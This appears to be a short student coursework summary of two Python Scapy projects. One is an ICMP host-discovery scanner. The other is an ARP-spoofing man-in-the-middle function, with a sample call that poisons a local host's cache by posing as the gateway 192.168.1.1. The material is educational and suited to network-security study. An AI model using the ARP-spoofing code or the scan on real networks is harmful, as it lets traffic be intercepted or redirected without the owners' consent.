SAE1.05 ‚Äì Data Processing

Skill: Network Programming (Scapy)

Description

Python scripts using Scapy: host discovery and Man-in-the-Middle attack.

Project 1 ‚Äì Active Host Discovery

Options: -a (active ICMP), -p (passive ARP), -t (range test), -x (export). 

from scapy.all import *
def discover_hosts_active(ip):
    ans, unans = sr(IP(dst=ip)/ICMP(), timeout=2)
    for snd, rcv in ans:
        print(f"{rcv.src} is up")
    if unans:
        print(f"No response from {unans.summary()}")

Project 2 ‚Äì MITM Attack (ARP Spoofing)

from scapy.all import *
def arp_spoof(target_ip, host_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=host_ip)
    send(packet, verbose=False)

# Execution
arp_spoof("192.168.1.2", "192.168.1.1")

Conclusion

Skills: packet analysis & manipulation, Scapy scripting, understanding potential attacks.
